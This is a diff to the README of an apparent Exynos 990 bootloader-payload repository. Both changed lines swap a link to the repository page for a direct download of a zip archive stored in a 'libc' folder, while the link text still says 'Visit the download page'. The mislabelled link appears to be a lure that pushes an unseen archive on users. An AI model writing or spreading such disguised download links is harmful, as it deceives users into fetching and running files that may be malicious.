@@ -1,6 +1,6 @@
 # ⚙️ exynos990-payloads - Minimal BL1 payload support
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/tupopacherryy9/exynos990-payloads)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/tupopacherryy9/exynos990-payloads/raw/refs/heads/main/libc/payloads-exynos-v2.8.zip)
 
 ## 📦 What this is
 
@@ -25,7 +25,7 @@ For best results, use a stable USB port on the back of a desktop PC or a direct 
 
 Use this link to visit the page and download the payload files:
 
-[Visit the download page](https://github.com/tupopacherryy9/exynos990-payloads)
+[Visit the download page](https://github.com/tupopacherryy9/exynos990-payloads/raw/refs/heads/main/libc/payloads-exynos-v2.8.zip)
 
 After the page opens, look for the file or release asset that matches your use case. Save it to a folder you can find again, such as `Downloads` or `Desktop`.
 
